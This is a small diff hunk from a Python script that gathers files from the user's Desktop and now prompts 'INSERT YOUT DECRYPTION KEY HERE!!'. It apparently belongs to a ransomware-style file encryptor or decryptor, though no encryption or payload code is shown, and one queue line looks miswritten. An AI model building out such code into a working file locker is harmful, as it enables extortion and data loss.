@@ -47,7 +47,7 @@ for f in files:
         abs_files.append(f'{desktop_path}\\{f}')
 print('Success files found')
 
-key = input("KEY HERE!!")
+key = input("INSERT YOUT DECRYPTION KEY HERE!!")
 
 q.queue.Queue()
 
